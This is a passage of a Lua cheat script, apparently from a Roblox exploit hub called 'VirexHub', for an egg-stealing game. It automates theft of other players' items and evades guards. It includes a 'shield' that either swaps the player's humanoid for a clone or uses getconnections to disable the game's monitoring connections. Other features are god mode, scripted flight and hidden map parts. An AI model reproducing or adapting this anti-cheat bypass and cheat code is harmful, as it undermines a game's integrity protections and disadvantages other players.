fn11()
end)
end
local tbl22 = { "bat", "katana", "axe", "staff", "club", "hammer", "sword", "blade" }
tbl4 = {
Steal = { Active = false, LastFinishedAt = 0, Carrying = false },
SafeCarry = {
Enabled = true,
SkipUnsafe = false,
WaitGuard = false,
SameSpeedBigEggs = false,
Blocked = {},
StretchSeconds = 6,
BeatGuard = false,
SlowUntil = 0,
SlowFactor = 0.3,
LineDrop = false,
LineGap = 12,
LineWait = 15,
DirectBudget = 450,
DirectMargin = 0.3,
CrossNow = false,
CrossSpeed = 231,
PickupSpeed = 154,
HopRatio = 1.515,
CrossRatio = 1,
PickupRatio = 0.667,
FarFromLine = 150,
DropDelay = 0.19,
LineApproach = 0.97,
ReJump = true,
ShakeTime = 0,
SnapPickup = false,
Hops = true,
HopStep = 350,
BackRunRatio = 15,
BackRunMax = 2000,
QuickRegrab = 1,
MidDrops = { 0.33, 0.66 },
MidRest = 0.1,
LagGrace = 4,
LockCamera = false,
HopGap = 0.1,
HopLift = 42,
HopStop = 48,
GetUp = true,
ShakeInside = 1,
CarryScale = 1,
EasyRatio = 1.3,
LastSkip = nil,
Category = nil,
PlanOk = true,
LightMult = 0.96,
Height = 70,
ClimbShare = 0.5,
Approach = "Run",
RunSpeed = 1,
RunWait = 0,
RunAnimate = true,
RunHeight = 50,
SnapLimit = 90,
StraightRun = true,
RunStyle = "Velocity",
CarryStyle = "Velocity",
SpeedJitter = 0.08,
Wobble = 0,
LaneOffset = 0,
JumpsPerMinute = 0,
PausesPerMinute = 0,
ReactMin = 0.2,
ReactMax = 0.6,
CarryReact = 0,
SpeedRatio = 1.5,
ExcessSeconds = 5.5,
GuardMargin = 4,
GuardRatio = 1.06,
MinRatio = 1.1,
BaseWait = 6.5,
FreeJump = 1500,
WaitRate = 0.9,
RecoverTries = math.huge,
GuessMult = 0.93,
CarryRatio = 0.9,
Mult = 1,
Seen = {},
JumpDistance = 0,
JumpAt = 0,
LastDelivered = 0,
LastFailed = 0,
Handle = nil,
},
Movement = {
Owner = nil,
PlaceWanted = false,
StealFirst = false,
MutationWanted = false,
FracturedWanted = false,
},
AntiGuard = {
Enabled = false,
Busy = false,
BusySince = 0,
HitArms = 0,
Handle = nil,
Render = nil,
},
IsBatTool = function(arg)
if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
return false
end
if arg:GetAttribute("IsBat") == true then
return true
end
local attribute = arg:GetAttribute("GearName")
if type(attribute) == "string" then
local gears = tbl.Gears
local directory = type(gears) == "table" and gears.Directory or nil
local flag = type(directory) == "table" and directory[attribute] or nil
return type(flag) == "table" and flag.BatControllerData ~= nil
end
if arg:GetAttribute("ItemType") ~= nil then
return false
end
local v15 = string.lower(arg.Name)
for _, v16 in ipairs(tbl22) do
if string.find(v15, v16, 1, true) then
return true
end
end
return false
end,
FindBat = function()
local character = localPlayer.Character
local tool = character and character:FindFirstChildWhichIsA("Tool")
if tbl4.IsBatTool(tool) then
return tool
end
local backpack = localPlayer:FindFirstChildOfClass("Backpack")
if backpack then
for _, child in ipairs(backpack:GetChildren()) do
if tbl4.IsBatTool(child) then
return child
end
end
end
if character then
for _, child in ipairs(character:GetChildren()) do
if tbl4.IsBatTool(child) then
return child
end
end
end
return nil
end,
IsNight = function()
local areaEggCycle = tbl.AreaEggCycle
if type(areaEggCycle) ~= "table" or type(areaEggCycle.IsNightPhase) ~= "function" then
return false
end
local ok, result = pcall(areaEggCycle.IsNightPhase, workspace:GetServerTimeNow())
return ok and result == true
end,
WallSealed = function()
local areaEggResetWall = tbl.AreaEggResetWall
if type(areaEggResetWall) ~= "table" or type(areaEggResetWall.IsSealed) ~= "function" then
return false
end
local ok, result = pcall(areaEggResetWall.IsSealed)
return ok and result == true
end,
WallOpenDelay = function()
local areaEggResetCycle = tbl.AreaEggResetCycle
if type(areaEggResetCycle) ~= "table" then
return 5
end
return (tonumber(areaEggResetCycle.WallCountdownDelayAfterDayStartsSeconds) or 2) + (tonumber(areaEggResetCycle.WallCountdownSeconds) or 3)
end,
}
local function fn10(arg, arg2)
return Vector2.new(arg.X - arg2.X, arg.Z - arg2.Z).Magnitude < 900 and math.abs(arg.Y - arg2.Y) < 400
end
tbl4.InMechArena = function()
if localPlayer:GetAttribute("InScrambleArena") == true then
return true
end
local character = localPlayer.Character
character = character and character:FindFirstChild("HumanoidRootPart")
if not character then
return false
end
local position = character.Position
if fn10(position, Vector3.new(-15035, -474, 4853)) then
return true
end
local scrambleArena = workspace:FindFirstChild("ScrambleArena")
if scrambleArena and scrambleArena:IsA("Model") then
local ok, result = pcall(scrambleArena.GetPivot, scrambleArena)
if ok and typeof(result) == "CFrame" and fn10(position, result.Position) then
return true
end
end
return false
end
tbl4.ClaimMovement = function(owner)
local movement = tbl4.Movement
if owner ~= "mech" and tbl4.InMechArena() then
return false
end
if movement.Owner == nil or movement.Owner == owner or movement.Owner == "treadmill" and owner ~= "treadmill" or movement.Owner == "scramble" and owner == "steal" then
movement.Owner = owner
return true
end
return false
end
tbl4.ReleaseMovement = function(arg)
if tbl4.Movement.Owner == arg then
tbl4.Movement.Owner = nil
end
end
do
local shieldMethods = { "Humanoid Swap", "Disable Monitor" }
tbl4.ShieldMethods = shieldMethods
local v15 = shieldMethods[1]
local tbl23 = {}
local tbl24 = {}
local connection = nil
local n5 = 0
local tbl25 = { Original = nil, Clone = nil, Links = {} }
local connection2 = nil
local tbl26 = {}
local function fn11()
for _, v16 in ipairs(tbl26) do
task.defer(function()
pcall(v16)
end)
end
end
tbl4.OnHumanoidChanged = function(arg)
table.insert(tbl26, arg)
local tbl27
tbl27 = {
Connected = true,
Disconnect = function()
tbl27.Connected = false
local v16 = table.find(tbl26, arg)
if v16 then
table.remove(tbl26, v16)
end
end,
}
return tbl27
end
local function fn12(humanoid)
pcall(function()
local playerScripts = localPlayer:FindFirstChild("PlayerScripts")
playerScripts = playerScripts and playerScripts:FindFirstChild("PlayerModule")
if playerScripts then
local controls = require(playerScripts):GetControls()
if type(controls) == "table" then
controls.humanoid = humanoid
end
end
end)
end
local function fn13(arg)
local animate = arg and arg:FindFirstChild("Animate")
if animate and animate:IsA("LocalScript") then
task.spawn(function()
animate.Enabled = false
task.wait()
animate.Enabled = true
end)
end
end
local function fn14()
for _, link in ipairs(tbl25.Links) do
pcall(function()
link:Disconnect()
end)
end
table.clear(tbl25.Links)
end
tbl4.UndoSwap = function()
fn14()
local character = localPlayer.Character
local original = tbl25.Original
local clone = tbl25.Clone
local v16 = tbl25
tbl25.Original = nil
v16.Clone = nil
if original and clone and character and original.Parent == nil and clone.Parent == character then
original.Parent = character
workspace.CurrentCamera.CameraSubject = original
fn12(original)
pcall(function()
clone:Destroy()
end)
fn13(character)
fn11()
end
end
local tbl27 = {
[Enum.HumanoidStateType.Running] = true,
[Enum.HumanoidStateType.RunningNoPhysics] = true,
[Enum.HumanoidStateType.Landed] = true,
}
tbl4.Grounded = function(arg)
if not arg then
arg = localPlayer.Character
arg = arg and arg:FindFirstChildOfClass("Humanoid")
end
if not arg or arg.Health <= 0 or arg.FloorMaterial == Enum.Material.Air then
return false
end
return tbl27[arg:GetState()] == true
end
tbl4.ShieldPaused = false
tbl4.WalkSpeed = function()
local character = localPlayer.Character
character = character and character:FindFirstChildOfClass("Humanoid")
character = character and character.WalkSpeed or 16
local original = tbl25.Original
if original and original.Health > 0 then
character = math.min(character, original.WalkSpeed)
end
local ok, result = pcall(function()
local leaderstats = localPlayer:FindFirstChild("leaderstats")
leaderstats = leaderstats and leaderstats:FindFirstChild("Speed")
local TreadmillUtil = require(ReplicatedStorage.Shared.Util.TreadmillUtil)
return leaderstats and TreadmillUtil.SpeedPowerToWalkSpeed(leaderstats.Value) or nil
end)
local n6
if ok and tonumber(result) and result > 0 then
n6 = math.min(character, result)
else
n6 = character
end
return n6
end
local function fn15()
local character = localPlayer.Character
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
if not humanoid or humanoid.Health <= 0 then
return
end
if tbl25.Clone and tbl25.Clone.Parent == character then
return
end
if not tbl4.Grounded(humanoid) then
return
end
local clone = humanoid:Clone()
humanoid.Parent = nil
clone.Parent = character
workspace.CurrentCamera.CameraSubject = clone
fn12(clone)
fn13(character)
local v16 = tbl25
tbl25.Original = humanoid
v16.Clone = clone
fn11()
table.insert(tbl25.Links, humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
if clone.Parent ~= nil then
clone.WalkSpeed = humanoid.WalkSpeed
end
end))
local animator = humanoid:FindFirstChildOfClass("Animator")
local animator2 = clone:FindFirstChildOfClass("Animator")
if animator and animator2 then
table.insert(tbl25.Links, animator.AnimationPlayed:Connect(function(arg)
local animation = arg.Animation
if not animation or clone.Parent == nil then
return
end
local ok, result = pcall(function()
return animator2:LoadAnimation(animation)
end)
if not ok or not result then
return
end
pcall(function()
result.Priority = arg.Priority
result.Looped = arg.Looped
local speed = arg.Speed
result:Play(0.05, math.max(arg.WeightTarget, 0.01), speed)
end)
local connection3 = nil
connection3 = arg.Stopped:Connect(function()
connection3:Disconnect()
pcall(function()
result:Stop(0.1)
end)
end)
end))
end
table.insert(tbl25.Links, clone.Died:Connect(function()
fn14()
local v17 = tbl25
tbl25.Original = nil
v17.Clone = nil
local character2 = localPlayer.Character
if character2 and humanoid.Parent == nil then
humanoid.Parent = character2
workspace.CurrentCamera.CameraSubject = humanoid
fn12(humanoid)
fn11()
end
pcall(function()
clone:Destroy()
end)
humanoid.Health = 0
end))
end
local function fn16()
if type(getconnections) ~= "function" then
return
end
for _, v16 in ipairs({ RunService.Heartbeat, RunService.PreSimulation, RunService.PostSimulation }) do
local ok, result = pcall(getconnections, v16)
if ok and type(result) == "table" then
for _, v17 in ipairs(result) do
local ok2, result2 = pcall(function()
return v17.Function
end)
ok2 = ok2 and type(result2) == "function"
local flag = false
local result3 = nil
if ok2 then
flag, result3 = pcall(debug.info, result2, "s")
end
if flag and string.find(tostring(result3), "UGI", 1, true) then
local ok3, result4 = pcall(function()
return v17.Enabled
end)
if not ok3 or result4 ~= false then
if pcall(function()
v17:Disable()
end) then
table.insert(tbl24, v17)
end
end
end
end
end
end
end
local function fn17()
if connection then
connection:Disconnect()
connection = nil
end
if connection2 then
connection2:Disconnect()
connection2 = nil
end
for _, v16 in ipairs(tbl24) do
pcall(function()
v16:Enable()
end)
end
table.clear(tbl24)
end
local function fn18()
if tbl4.ShieldPaused then
return
end
if v15 == shieldMethods[1] then
fn15()
else
fn16()
end
end
local function fn19()
fn18()
n5 = 0
connection = RunService.Heartbeat:Connect(function(deltaTime)
n5 += deltaTime
local character = localPlayer.Character
local flag = v15 == shieldMethods[1]
if flag then
flag = not (tbl25.Clone and character and tbl25.Clone.Parent == character)
end
if n5 >= (flag and 0.25 or 3) then
n5 = 0
fn18()
end
end)
connection2 = localPlayer.CharacterAdded:Connect(function(character)
fn14()
local v16 = tbl25
tbl25.Original = nil
v16.Clone = nil
if v15 ~= shieldMethods[1] then
return
end
task.spawn(function()
character:WaitForChild("Humanoid", 10)
task.wait(1)
if connection and localPlayer.Character == character then
fn18()
end
end)
end)
end
tbl4.Swapped = function()
if v15 ~= shieldMethods[1] then
return true
end
local character = localPlayer.Character
return tbl25.Clone ~= nil and character ~= nil and tbl25.Clone.Parent == character
end
tbl4.Shield = function(arg, arg2)
tbl23[arg] = arg2 == true or nil
if next(tbl23) == nil then
fn17()
return
end
if connection then
return
end
fn19()
end
tbl4.SetShieldMethod = function(arg)
if not table.find(shieldMethods, arg) or arg == v15 then
return
end
local flag = connection ~= nil
fn17()
v15 = arg
if flag and next(tbl23) ~= nil then
fn19()
end
end
fn4(fn17)
end
tbl4.Shield("load", true)
tbl4.Toggle = function(arg, arg2)
if type(arg) ~= "table" then
return arg2 == true
end
local ok, result = pcall(function()
local controller = arg._controller
return type(controller) == "table" and type(controller.GetValue) == "function" and controller.GetValue()
end)
if ok and type(result) == "boolean" then
return result
end
for _, v15 in ipairs({ "Get", "GetValue" }) do
local ok2, result2 = pcall(function()
return arg[v15]
end)
if ok2 and type(result2) == "function" then
local ok3, result3 = pcall(result2, arg)
if ok3 and type(result3) == "boolean" then
return result3
end
end
end
return arg2 == true
end
tbl4.Root = function()
local character = localPlayer.Character
character = character and character:FindFirstChild("HumanoidRootPart")
return character and character:IsDescendantOf(workspace) and character or nil
end
tbl4.PlacedPoints = function()
local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
local tbl23 = {}
if not placedEggRenders then
return tbl23
end
local str2 = tostring(localPlayer.UserId)
for _, child in ipairs(placedEggRenders:GetChildren()) do
if string.find(child.Name, str2, 1, true) then
local ok, result = pcall(function()
return child:IsA("Model") and child:GetPivot() or child.CFrame
end)
if ok then
table.insert(tbl23, result.Position)
end
end
end
return tbl23
end
tbl4.OwnPlot = function()
local plots = workspace:FindFirstChild("Plots")
if not plots then
return nil
end
for _, child in ipairs(plots:GetChildren()) do
local plotSign = child:FindFirstChild("PlotSign")
plotSign = plotSign and plotSign:FindFirstChild("PlayerPlotSign")
plotSign = plotSign and plotSign:FindFirstChild("Frame")
plotSign = plotSign and plotSign:FindFirstChild("PlayerName")
if plotSign and plotSign:IsA("TextLabel") then
local v15 = string.lower(plotSign.Text)
if v15 == string.lower(localPlayer.Name) or v15 == string.lower(localPlayer.DisplayName) then
return child
end
end
end
return nil
end
local function fn11()
local v15 = tbl4.PlacedPoints()
if #v15 == 0 then
return nil
end
local vector = Vector3.zero
for _, v16 in ipairs(v15) do
vector += v16
end
return vector / #v15
end
tbl4.PenAnchor = function()
local v15 = fn11()
if v15 then
return v15
end
local v16 = tbl4.OwnPlot()
if not v16 then
return nil
end
local toUpdate = v16:FindFirstChild("ToUpdate")
local starterPen = toUpdate and toUpdate:FindFirstChild("StarterPen") or v16:FindFirstChild("CenterPoint")
if not starterPen then
return nil
end
local ok, result = pcall(function()
return starterPen:IsA("Model") and starterPen:GetPivot() or starterPen.CFrame
end)
return ok and result.Position or nil
end
tbl4.Plot = function()
local v15 = tbl4.OwnPlot()
if v15 then
return v15
end
local plots = workspace:FindFirstChild("Plots")
local v16 = fn11()
if not plots or not v16 then
return nil
end
local huge = math.huge
local v17 = nil
for _, child in ipairs(plots:GetChildren()) do
local ok, result, result2 = pcall(function()
return child:GetBoundingBox()
end)
if ok and result and result2 then
local v18 = result:PointToObjectSpace(v16)
local n5 = result2.X / 2
local flag = math.abs(v18.X) <= n5
local flag2
if flag then
local n6 = result2.Z / 2
flag2 = math.abs(v18.Z) <= n6
else
flag2 = flag
end
if flag2 then
return child
end
local magnitude = (result.Position - v16).Magnitude
if magnitude < huge then
v17 = child
huge = magnitude
end
end
end
if v17 and huge <= 60 then
return v17
end
return nil
end
tbl4.Belt = function()
local v15 = tbl4.Plot()
if not v15 then
return nil
end
local treadmillBottom = v15:FindFirstChild("TreadmillBottom")
if treadmillBottom and treadmillBottom:IsA("BasePart") then
return treadmillBottom
end
local clientTreadmillRenders = workspace:FindFirstChild("__ClientTreadmillRenders")
clientTreadmillRenders = clientTreadmillRenders and clientTreadmillRenders:FindFirstChild("TreadmillRender_" .. v15.Name)
if clientTreadmillRenders then
clientTreadmillRenders = clientTreadmillRenders:FindFirstChild("BoundingBoxPart") or clientTreadmillRenders:IsA("Model") and clientTreadmillRenders.PrimaryPart or clientTreadmillRenders:FindFirstChildWhichIsA("BasePart")
end
if clientTreadmillRenders then
return clientTreadmillRenders
end
local treadmillUpgrade = v15:FindFirstChild("TreadmillUpgrade")
return treadmillUpgrade and treadmillUpgrade:FindFirstChildWhichIsA("BasePart") or nil
end
tbl4.DistanceTo = function(arg)
local v15 = tbl4.Root()
if not v15 or not arg then
return math.huge
end
return (v15.Position - arg).Magnitude
end
do
local tbl23 = {}
local n5 = 0
local function fn12()
local v15 = tbl4.Plot()
if not v15 then
return {}
end
local tbl24 = {}
for _, v16 in ipairs({ "TreadmillBottom", "TreadmillUpgrade" }) do
local v17 = v15:FindFirstChild(v16)
if v17 then
if v17:IsA("BasePart") then
table.insert(tbl24, v17)
else
for _, descendant in ipairs(v17:GetDescendants()) do
if descendant:IsA("BasePart") then
table.insert(tbl24, descendant)
end
end
end
end
end
local clientTreadmillRenders = workspace:FindFirstChild("__ClientTreadmillRenders")
clientTreadmillRenders = clientTreadmillRenders and clientTreadmillRenders:FindFirstChild("TreadmillRender_" .. v15.Name)
if clientTreadmillRenders then
for _, descendant in ipairs(clientTreadmillRenders:GetDescendants()) do
if descendant:IsA("BasePart") then
table.insert(tbl24, descendant)
end
end
end
return tbl24
end
local function fn13()
for _, v15 in ipairs(fn12()) do
if not tbl23[v15] then
tbl23[v15] = {
CFrame = v15.CFrame,
CanTouch = v15.CanTouch,
CanCollide = v15.CanCollide,
Transparency = v15.Transparency,
}
pcall(function()
v15.CanTouch = false
v15.CanCollide = false
v15.Transparency = 1
v15.CFrame = v15.CFrame - Vector3.new(0, 120, 0)
end)
end
end
end
local function fn14()
for k, v15 in pairs(tbl23) do
if k and k.Parent then
pcall(function()
k.CFrame = v15.CFrame
k.CanTouch = v15.CanTouch
k.CanCollide = v15.CanCollide
k.Transparency = v15.Transparency
end)
end
end
table.clear(tbl23)
end
tbl4.HoldBelt = function()
n5 += 1
fn13()
end
tbl4.ReleaseBelt = function()
n5 = math.max(0, n5 - 1)
if n5 == 0 then
fn14()
end
end
tbl4.BeltHeld = function()
return n5 > 0
end
tbl4.RefreshBeltHide = function()
if n5 > 0 then
fn13()
end
end
fn4(function()
n5 = 0
fn14()
end)
tbl4.LeaveBelt = function()
local rfTreadmillAskDoff = networking:FindFirstChild("RF/Treadmill/AskDoff")
if rfTreadmillAskDoff and rfTreadmillAskDoff:IsA("RemoteFunction") then
pcall(rfTreadmillAskDoff.InvokeServer, rfTreadmillAskDoff)
end
end
tbl4.Treadmill = { Riding = false }
tbl4.ResetBelt = function()
n5 = 0
fn14()
end
tbl4.OnBelt = function()
local v15 = tbl4.Belt()
if not v15 or tbl23[v15] then
return false
end
local v16 = tbl4.Root()
if not v16 then
return false
end
local v17 = v15.CFrame:PointToObjectSpace(v16.Position)
local n6 = v15.Size.X / 2 + 2
local flag = math.abs(v17.X) <= n6
local flag2
if flag then
local n7 = v15.Size.Z / 2 + 2
flag2 = math.abs(v17.Z) <= n7
else
flag2 = flag
end
return flag2 and v17.Y >= -2 and v17.Y <= v15.Size.Y / 2 + 8
end
end
tbl4.ExitBelt = function()
tbl4.Treadmill.Riding = false
tbl4.LeaveBelt()
local character = localPlayer.Character
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
if humanoid then
pcall(function()
humanoid.Jump = true
humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
end)
end
task.wait(0.35)
end
tbl4.Flying = false
tbl4.Driving = 0
tbl4.BeginFlight = function()
tbl4.Flying = true
local character = localPlayer.Character
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
if humanoid then
humanoid.PlatformStand = true
pcall(function()
humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
end)
end
return tbl4.Root() ~= nil
end
tbl4.SetFlightVelocity = function(assemblyLinearVelocity)
local v15 = tbl4.Root()
if v15 then
v15.AssemblyLinearVelocity = assemblyLinearVelocity
v15.AssemblyAngularVelocity = Vector3.zero
end
end
tbl4.EndFlight = function()
tbl4.Flying = false
local v15 = tbl4.Root()
if v15 then
pcall(function()
v15.AssemblyLinearVelocity = Vector3.zero
v15.AssemblyAngularVelocity = Vector3.zero
end)
end
local character = localPlayer.Character
character = character and character:FindFirstChildOfClass("Humanoid")
if character then
character.PlatformStand = false
end
end
do
local tbl23 = {
Enum.HumanoidStateType.FallingDown,
Enum.HumanoidStateType.Ragdoll,
Enum.HumanoidStateType.Physics,
Enum.HumanoidStateType.Seated,
Enum.HumanoidStateType.PlatformStanding,
}
local tbl24 = {}
local flag = false
tbl4.GodMode = function(arg)
local character = localPlayer.Character
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
if not character or not humanoid then
return
end
if arg then
flag = true
for _, v15 in ipairs(tbl23) do
pcall(function()
humanoid:SetStateEnabled(v15, false)
end)
end
pcall(function()
humanoid.BreakJointsOnDeath = false
end)
for _, descendant in ipairs(character:GetDescendants()) do
if descendant:IsA("BasePart") and tbl24[descendant] == nil then
tbl24[descendant] = descendant.CanCollide
pcall(function()
descendant.CanCollide = false
end)
end
end
elseif flag then
flag = false
for _, v15 in ipairs(tbl23) do
pcall(function()
humanoid:SetStateEnabled(v15, true)
end)
end
for k, v15 in pairs(tbl24) do
if k and k.Parent then
pcall(function()
k.CanCollide = v15
end)
end
end
table.clear(tbl24)
end
end
end
tbl4.GodTick = function()
local character = localPlayer.Character
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
if humanoid and humanoid.Health < humanoid.MaxHealth then
pcall(function()
humanoid.Health = humanoid.MaxHealth
end)
end
end
tbl4.StopWalking = function()
local character = localPlayer.Character
local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
if humanoid and humanoidRootPart then
pcall(function()
humanoid:MoveTo(humanoidRootPart.Position)
humanoid:Move(Vector3.zero, false)
end)
end
end
local function fn12(arg, arg2, arg3, arg4)
local n5 = tonumber(arg2) or 6
local n6 = tonumber(arg3) or 10
local n7 = 0
local flag = nil
local n8 = 0
local n9 = 0
while n7 < n6 do
if type(arg4) == "function" and arg4() then
tbl4.StopWalking()
return false
end
local character = localPlayer.Character
local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
character = character and character:FindFirstChildOfClass("Humanoid")
if not humanoidRootPart or not character or character.Health <= 0 then
return false
end
if (humanoidRootPart.Position - arg).Magnitude <= n5 then
tbl4.StopWalking()
return true
end
flag = flag and (humanoidRootPart.Position - flag).Magnitude < 1
if flag then
n8 += 0.2
else
n8 = 0
end
flag = humanoidRootPart.Position
n9 = math.max(0, n9 - 0.2)
if n8 >= 0.8 and n9 <= 0 then
tbl4.LeaveBelt()
pcall(function()
character.Jump = true
end)
n8 = 0
n9 = 1.5
end
character:MoveTo(arg)
n7 += task.wait(0.2)
end
tbl4.StopWalking()
return tbl4.DistanceTo(arg) <= n5
end
tbl4.WalkTo = function(arg, arg2, arg3, arg4)
tbl4.Driving = tbl4.Driving + 1
local ok, result = pcall(fn12, arg, arg2, arg3, arg4)
tbl4.Driving = math.max(0, tbl4.Driving - 1)
return ok and result == true
end
local tbl23 = {
Boss = "Fractured",
GreatBloom = "Spirit Bloom",
Sakura = "Bloom",
Monstrous = "Parasite",
}
task.spawn(function()
local mutations = tbl.Mutations
local ok, result = pcall(function()
return mutations.All()
end)
if ok and type(result) == "table" then
for k, v15 in pairs(result) do
local id = type(v15) == "table" and (v15.Id or k) or nil
local label = type(v15) == "table" and v15.Label or nil
if id ~= nil and type(label) == "string" and label ~= "" then
tbl23[tostring(id)] = label
end
end
end
end)
fn7 = function(arg)
return tbl23[tostring(arg)] or tostring(arg)
end
local tbl24
tbl24 = {
"Forest",
"Desert",
"Snow",
"Lake",
"Jungle",
"Volcano",
"Prehistoric",
"Cosmic",
"Abyss Ocean",
"Cherry Blossom",
"Light Dark",
"Titan Temple",
}
local tbl25 = {}
for _, v15 in ipairs(tbl24) do
tbl25[v15] = true
end
task.spawn(function()
local eggState = tbl.EggState
local ok, result = pcall(function()
return eggState.ReadFieldEggs()
end)
if ok and type(result) == "table" and type(result.Records) == "table" then
for _, record in pairs(result.Records) do
local areaId = type(record) == "table" and record.AreaId or nil
if type(areaId) == "string" and not tbl25[areaId] then
tbl25[areaId] = true
table.insert(tbl24, areaId)
end
end
end
end)
tbl13 = { "Any" }
tbl14 = { Any = 0 }
do
local tbl26 = {}
local directory = tbl.Assets and tbl.Assets.Directory
if type(directory) == "table" then
for _, v15 in pairs(directory) do
local rarity = type(v15) == "table" and v15.Rarity or nil
local flag = type(rarity) == "table"
local num
if flag then
num = tonumber(rarity.RarityNumber or rarity.Rank)
else
num = flag
end
num = num or nil
if num then
local str2 = tbl26[num]
if not str2 then
str2 = tostring(rarity.DisplayName or rarity._id or num)
end
tbl26[num] = str2
end
end
end
if next(tbl26) == nil then
tbl26 = {
"Common",
"Uncommon",
"Rare",
"Epic",
"Legendary",
"Mythic",
"Cosmic",
"Secret",
"Eternal",
"Divine",
}
end
local tbl27 = {}
for k in pairs(tbl26) do
table.insert(tbl27, k)
end
table.sort(tbl27)
for _, v15 in ipairs(tbl27) do
table.insert(tbl13, tbl26[v15])
tbl14[tbl26[v15]] = v15
end
end
tbl5 = { "Best Rarity", "Biggest Weight", "Best Mutation", "Highest Value", "Lowest Value" }
local tbl26
tbl26 = {}
local n5
n5 = 0
local tbl27
tbl27 = {}
local tbl28
tbl28 = {}
local tbl29
tbl29 = {}
local tbl30
tbl30 = {}
tbl4.Steal.RiftPriority = false
tbl4.Steal.RiftNeeds = {}
tbl4.Steal.RiftRequirements = {}
tbl4.Steal.RiftCurrent = {}
tbl4.StockWaits = function(arg)
if type(arg) ~= "table" or not arg.RiftOnly or arg.RiftNow then
return false
end
local mech = tbl4.Mech
if type(mech) ~= "table" or tbl4.Toggle(mech.Handle, false) ~= true then
return false
end
return mech.Busy == true or workspace:FindFirstChild("ScrambleArenaPortal") ~= nil or localPlayer:GetAttribute("InScrambleArena") == true
end
tbl4.Lab = {
Banners = {},
Reserved = {},
SkipOwned = true,
Stock = {},
StockEggs = {},
StockPer = 3,
Pools = {},
PoolLists = {},
}
tbl4.Lab.Shares = {
Biohazard = {
{ "Cyclops Gorilla", 0.431 },
{ "Red Panda", 0.431 },
{ "Snowy Owl", 0.399 },
{ "Salamander", 0.381 },
{ "Pterodactyl", 0.234 },
{ "Galaxy Gecko", 0.202 },
{ "Ankylosaurus", 0.194 },
{ "Crane", 0.138 },
{ "Parrotfish", 0.126 },
{ "Centapede", 0.106 },
{ "Dodo", 0.104 },
{ "Swordfish", 0.1 },
{ "Koi", 0.046 },
{ "La Vacca Saturno Saturnita", 0.044 },
{ "Finned Thresher", 0.024 },
{ "Bronto", 0.019 },
{ "Triceratops", 0.013 },
{ "Orca", 0.009 },
},
Experimental = {
{ "Blade Head", 0.342 },
{ "Red Panda", 0.341 },
{ "Crab", 0.331 },
{ "Salamander", 0.327 },
{ "Snowy Owl", 0.324 },
{ "Mantis", 0.314 },
{ "Cyclops Gorilla", 0.178 },
{ "Galaxy Gecko", 0.161 },
{ "Crane", 0.135 },
{ "Kaiju Spider", 0.134 },
{ "Pterodactyl", 0.119 },
{ "Dodo", 0.096 },
{ "Centapede", 0.094 },
{ "Rhino", 0.034 },
{ "Koi", 0.032 },
{ "Ankylosaurus", 0.03 },
{ "La Vacca Saturno Saturnita", 0.01 },
{ "Bronto", 0.001 },
{ "Triceratops", 0.001 },
},
UnstableDNA = {
{ "Toro", 0.236 },
{ "Lamb", 0.232 },
{ "Blade Head", 0.228 },
{ "Imp", 0.223 },
{ "Crab", 0.22 },
{ "Moth", 0.219 },
{ "Demon Hound", 0.217 },
{ "Peacock", 0.21 },
{ "Mantis", 0.203 },
{ "Salamander", 0.165 },
{ "Dove", 0.104 },
{ "Flame Sprite", 0.103 },
{ "Galaxy Gecko", 0.103 },
{ "Kaiju Spider", 0.102 },
{ "Red Panda", 0.102 },
{ "Crane", 0.096 },
{ "Snowy Owl", 0.088 },
{ "Centapede", 0.064 },
{ "Cyclops Gorilla", 0.021 },
{ "Jellyfish", 0.02 },
{ "Dark Gargoyle", 0.019 },
{ "Rhino", 0.018 },
{ "Koi", 0.009 },
{ "La Vacca Saturno Saturnita", 0.001 },
},
}
tbl4.Lab.Pickers = {}
tbl4.Lab.ExtraPath = "VirexHub/SAE_LabEggs.json"
tbl4.Lab.RefreshPools = function()
local lab = tbl4.Lab
local ok, result = pcall(function()
return require(ReplicatedStorage.Shared.Modules.ScrambleTradeInRecipes)
end)
if not ok or type(result) ~= "table" or type(result.Simulate) ~= "function" then
return
end
local HttpService = game:GetService("HttpService")
local tbl31 = {}
pcall(function()
if isfile(lab.ExtraPath) then
local data = HttpService:JSONDecode(readfile(lab.ExtraPath))
if type(data) == "table" then
tbl31 = data
end
end
end)
local flag = false
for k, share in pairs(lab.Shares) do
local ok2, result2 = pcall(result.Simulate, k, 4000)
if ok2 and type(result2) == "table" and type(result2.SlotPicks) == "table" then
local n6 = math.max(1, tonumber(result2.Runs) or 4000)
local tbl32 = {}
for _, slotPick in pairs(result2.SlotPicks) do
if type(slotPick) == "table" then
for k2, v15 in pairs(slotPick) do
local str2 = tostring(k2)
tbl32[str2] = (tbl32[str2] or 0) + (tonumber(v15) or 0)
end
end
end
local tbl33 = type(tbl31[k]) == "table" and tbl31[k] or {}
local tbl34 = {}
local tbl35 = {}
local flag2 = false
for _, v15 in ipairs(share) do
local v16 = v15[1]
local v17 = v15[2]
if (tbl32[v16] or 0) > 0 or v17 < 0.02 then
tbl34[v16] = true
table.insert(tbl35, { v16, v17 })
else
flag2 = true
end
end
for k2, v15 in pairs(tbl32) do
if not tbl34[k2] and v15 > 0 then
local num = tonumber(tbl33[k2])
if not num then
num = math.max(0.001, math.floor(v15 / n6 * 1000 + 0.5) / 1000)
tbl33[k2] = num
tbl31[k] = tbl33
flag = true
end
table.insert(tbl35, { k2, num })
flag2 = true
end
end
if flag2 then
table.sort(tbl35, function(arg, arg2)
if arg[2] ~= arg2[2] then
return arg[2] > arg2[2]
end
return arg[1] < arg2[1]
end)
lab.Shares[k] = tbl35
lab.Pools[k] = nil
lab.PoolLists[k] = nil
local v15 = lab.Pickers[k]
if v15 and v15.Handle and type(v15.Handle.SetOptions) == "function" and type(lab.LabelsFor) == "function" then
local v16, v17 = lab.LabelsFor(k)
if #v16 > 0 then
v15.CategoryOf = v17
pcall(v15.Handle.SetOptions, v15.Handle, v16, nil, true)
end
end
end
end
task.wait()
end
